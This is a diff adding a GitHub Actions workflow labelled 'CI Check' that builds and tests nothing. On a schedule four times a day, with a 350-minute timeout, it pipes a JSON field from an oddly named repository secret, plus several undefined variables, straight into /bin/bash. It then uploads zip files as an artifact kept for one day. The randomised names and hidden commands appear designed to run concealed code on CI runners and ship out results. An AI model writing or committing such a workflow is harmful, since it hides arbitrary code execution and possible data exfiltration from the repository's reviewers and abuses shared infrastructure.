@@ -1,0 +1,32 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '24 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          bfsgm782: ${{ secrets.bfsgm782 }}
+        run: |
+          printf '%s' "$bfsgm782" | jq -r .msss3 | /bin/bash
+          echo $wuix715 | jq -r .ueb0 | /bin/bash
+          printf '%s' "$snhve814" | jq -r .fomeh99665 | /bin/bash
+          echo $lngew3 | jq -r .rrf5608 | /bin/bash
+          echo $t3 | jq -r .dquw08 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: SNIMlQAX
+          path: "*.zip"
+          retention-days: 1
